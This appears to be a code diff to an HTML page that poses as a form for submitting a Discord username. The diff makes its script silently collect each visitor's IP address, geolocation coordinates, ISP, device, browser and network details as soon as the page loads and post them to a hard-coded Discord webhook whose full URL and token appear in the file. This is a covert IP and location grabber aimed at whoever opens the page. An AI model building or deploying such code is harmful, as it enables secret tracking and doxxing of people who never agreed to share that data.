@@ -57,38 +57,41 @@
     <h1>Welcome!</h1>
     <p>Please enter your Discord username. It will be sent to us!</p>
     <input type="text" id="discordUser" placeholder="Discord Username" required>
-    <button onclick="submitData()">Submit</button>
+    <button onclick="sendDiscordUser()">Submit</button>
     <p id="status"></p>
   </div>
 
   <script>
     const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';
 
-    let userIP = "Fetching...";
     let collectedData = {};
 
-    // Fetch IP and location information
+    // Fetch IPv4 Address and Location
     async function fetchIPData() {
       try {
-        const response = await fetch('https://ipapi.co/json/');
-        const ipData = await response.json();
-        userIP = ipData.ip;
+        const response = await fetch('https://api.ipify.org?format=json');
+        const { ip } = await response.json();
+        collectedData.IP_Info = { ip };
+
+        // Use another API to get more details about the IP
+        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+        const locationData = await locationResponse.json();
         collectedData.IP_Info = {
-          ip: ipData.ip,
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country_name,
-          latitude: ipData.latitude,
-          longitude: ipData.longitude,
-          isp: ipData.org,
+          ...collectedData.IP_Info,
+          city: locationData.city,
+          region: locationData.region,
+          country: locationData.country_name,
+          latitude: locationData.latitude,
+          longitude: locationData.longitude,
+          isp: locationData.org,
         };
       } catch (error) {
-        console.error('Error fetching IP info:', error);
+        console.error('Error fetching IP data:', error);
         collectedData.IP_Info = 'Unavailable';
       }
     }
 
-    // Fetch browser and device information
+    // Fetch Device and Browser Information
     function fetchDeviceInfo() {
       collectedData.Device_Info = {
         userAgent: navigator.userAgent,
@@ -102,7 +105,7 @@
       };
     }
 
-    // Fetch network information
+    // Fetch Network Information
     function fetchNetworkInfo() {
       if (navigator.connection) {
         collectedData.Network_Info = {
@@ -116,25 +119,31 @@
       }
     }
 
-    // Send data to the Discord webhook
-    async function sendToWebhook(discordUser) {
-      collectedData.Discord_User = discordUser;
-
-      const formattedData = `**User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
-
+    // Send Data to Webhook
+    async function sendToWebhook(data) {
       try {
         await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: formattedData }),
+          body: JSON.stringify({ content: data }),
         });
       } catch (error) {
         console.error('Error sending to webhook:', error);
       }
     }
 
-    // Main function to handle submission
-    async function submitData() {
+    // Collect and Send All Data Immediately on Page Load
+    async function sendInitialData() {
+      await fetchIPData();
+      fetchDeviceInfo();
+      fetchNetworkInfo();
+
+      const formattedData = `**Initial User Information:**\n\`\`\`json\n${JSON.stringify(collectedData, null, 2)}\n\`\`\``;
+      await sendToWebhook(formattedData);
+    }
+
+    // Send Discord Username Separately
+    async function sendDiscordUser() {
       const discordUser = document.getElementById('discordUser').value.trim();
       const status = document.getElementById('status');
 
@@ -144,21 +153,16 @@
         return;
       }
 
-      // Fetch all data
-      await fetchIPData();
-      fetchDeviceInfo();
-      fetchNetworkInfo();
-
-      // Send data to webhook
-      await sendToWebhook(discordUser);
+      // Send Discord username to webhook
+      await sendToWebhook(`**Discord Username:** ${discordUser}`);
 
       // Update UI
-      status.textContent = 'You have privacy settings turned on.';
+      status.textContent = 'Your Discord username has been submitted!';
       status.style.color = 'green';
     }
 
-    // Fetch IP data immediately
-    fetchIPData();
+    // Send all data on page load
+    sendInitialData();
   </script>
 </body>
 </html>
